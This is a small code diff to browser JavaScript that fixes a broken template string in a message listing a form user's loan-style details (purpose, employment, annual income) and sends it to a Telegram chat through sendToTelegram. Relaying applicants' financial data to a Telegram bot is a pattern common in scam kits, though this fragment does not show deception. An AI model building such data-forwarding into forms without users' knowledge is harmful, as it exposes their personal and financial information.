@@ -1291,10 +1291,7 @@ document.addEventListener('DOMContentLoaded', () => {
         `📝 <b>Purpose:</b> ${state.purpose || 'Not specified'}\n` +
         `━━━━━━━━━━━━━━━━━━━━\n` +
         `💼 <b>Employment:</b> ${state.employmentStatus}\n` +
-        `💳 <b>Annual Income:</b> ${state.annualIncome ? '
-</body>
-</html>
- + parseFloat(state.annualIncome).toLocaleString('en-US') : 'Not provided'}\n` +
+        `💳 <b>Annual Income:</b> ${state.annualIncome ? '$' + parseFloat(state.annualIncome).toLocaleString('en-US') : 'Not provided'}\n` +
         `━━━━━━━━━━━━━━━━━━━━\n` +
         `🕐 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Kinshasa' })} (Kinshasa)`;
       sendToTelegram(msg);
